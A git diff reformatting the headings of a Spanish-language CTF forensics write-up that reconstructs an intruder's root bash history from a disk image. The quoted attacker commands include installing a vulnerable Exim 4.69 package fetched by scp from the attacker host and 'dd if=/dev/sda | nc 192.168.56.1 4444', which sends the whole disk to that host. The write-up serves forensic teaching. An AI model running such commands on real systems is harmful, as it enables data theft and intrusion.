@@ -34,7 +34,7 @@ Reto de ctf sobre una intrusion a un sistema
 
 ---
 <a name="extraerzip"></a>
-<h2>1- Extrayendo el zip</h2>
+### 1- Extrayendo el zip
 Descargamos DiscoS.zip y lo extraemos usando la contraseña que nos ofrecen
 
 ```bash
@@ -43,7 +43,7 @@ unzip discoS.zip
 ![unzip](https://user-images.githubusercontent.com/47476901/151601581-c8a5e5b8-d5ca-48f0-bed3-784c8587ee69.png)
 
 <a name="montarimg"></a>
-<h2>2- Montar la imagen</h2>
+### 2- Montar la imagen
 Nos extrae una imagen, montaremos esta imagen en una carpeta para ver lo que contiene.
 
 ```bash
@@ -53,7 +53,7 @@ sudo mount discoS.img disco
 ![mount](https://user-images.githubusercontent.com/47476901/151601607-9c2dfb92-f96d-4793-b7d6-42c71a9af47a.png)
 
 <a name="analizarcomandos"></a>
-<h2>3- Analizar historial comandos</h2>
+### 3- Analizar historial comandos
 Anteriormente nos indicaron que esta imagen del sistema tiene algo raro, puede que sea algo malicioso, para ello comprobaremos si accedieron al usuario root y si es así que podamos ver que comandos ejecutaron como usuario administrador.
 
 ```bash
@@ -63,7 +63,7 @@ cat root/.bash_history
 
 ### <b>¿Que hizo el atacante como administrador?</b>
 <br>
-###### 1- Elimina el programa exim del sistema
+**1- Elimina el programa exim del sistema**
 
 ```bash
 apt-get remove exim4
@@ -76,7 +76,7 @@ apt-get remove exim
 dpkg -l | grep exim
 ```
 
-###### 2- Comprueba en que ruta se encuentra, crea una carpeta llamada exim4 y la abre. 
+**2- Comprueba en que ruta se encuentra, crea una carpeta llamada exim4 y la abre. **
 
 ```bash
 pwd
@@ -84,13 +84,13 @@ mkdir exim4
 cd exim4/
 ```
 
-###### 3- Con el comando scp copia todos los archivos mediante ssh del host del atacante en la nueva carpeta
+**3- Con el comando scp copia todos los archivos mediante ssh del host del atacante en la nueva carpeta**
 
 ```bash
 scp yom@192.168.56.1:/home/yom/temporary/exim4/* .
 ```
 
-###### 4- Instala los paquetes vulnerables de exim que se descargó desde su maquina remotamente.
+**4- Instala los paquetes vulnerables de exim que se descargó desde su maquina remotamente.**
 
 <li>Esta version de Exim tiene una vulnerabilidad critica</li>
 <li>Exim 4.69 Remote Code Execution via Buffer overflow (Desbordar la memoria)</li>
@@ -104,27 +104,27 @@ dpkg -i exim4-base_4.69-9_i386.deb
 dpkg -i exim4-daemon-light_4.69-9_i386.deb 
 ```
 
-###### 5- Una vez instalados todos los paquetes vulnerables, sale de la carpeta y la elimina.
+**5- Una vez instalados todos los paquetes vulnerables, sale de la carpeta y la elimina.**
 
 ```bash
 cd ..
 rm -rf exim4/
 ```
 
-###### 6- Detiene todos las operaciones de la CPU con el comando halt.
+**6- Detiene todos las operaciones de la CPU con el comando halt.**
 
 <li>Se usa para indicar al hardware que detenga todas las funciones de la CPU.</li>
 
 <li>Es decir, reinicia o detiene el sistema</li>
 
 
-###### 7- Instala el programa OpenSSH cifra las conexiones a traves de la red. (alternativa al SSH)
+**7- Instala el programa OpenSSH cifra las conexiones a traves de la red. (alternativa al SSH)**
 ```bash
 apt-get install openssh-server
 apt-get install openssh-server
 ```
 
-###### 8- Configura el servidor de correo vulnerable y reinicia el sistema.
+**8- Configura el servidor de correo vulnerable y reinicia el sistema.**
 
 ```bash
 cd /etc/exim4/
@@ -135,7 +135,7 @@ halt
 reboot
 ```
 
-###### 9- Busca las rutas de los binarios gcc, memdump.
+**9- Busca las rutas de los binarios gcc, memdump.**
 <li>No tiene el binario memdump instalado, lo instala</li>
 <li>memdump hace un volcado de memoria</li>
 <li>gcc es un compilador</li>
@@ -147,14 +147,14 @@ apt-get install memdump
 halt
 ```
 
-###### 10- Comprueba si tiene conexion con su maquina dentro de la red
+**10- Comprueba si tiene conexion con su maquina dentro de la red**
 
 ```bash
 ifconfig 
 ping 192.168.56.1
 ```
 
-###### 11- Robando datos
+**11- Robando datos**
 <li>El comando dd es una herramienta muy poderosa, limpia, verifica, destruye, duplica datos.</li>
 <li>Copió la partición a traves de una conexion usando netcat</li>
 <li>Lo que hizo fue que todo el contenido de la particion se mandase a traves de esa conexion.</li>
@@ -167,7 +167,7 @@ dd if=/dev/sda | nc 192.168.56.1 4444
 dd if=/dev/sda1 | nc 192.168.56.1 4444
 ```
 
-###### 12- Recuperando los datos transferidos.
+**12- Recuperando los datos transferidos.**
 <li>El atacante instala 2 herramientas forenses para recuperar datos de esas particiones que se hayan podido volver corruptos.</li>
 
 ```bash
@@ -176,7 +176,7 @@ apt-get install dcfldd
 ```
 <br>
 <a name="appmaliciosa"></a>
-<h2>4- Analizando aplicacion maliciosa</h2>
+### 4- Analizando aplicacion maliciosa
 
 Ya hemos visto que la aplicacion maliciosa es exim, un servicio de transferencia de correo.
 
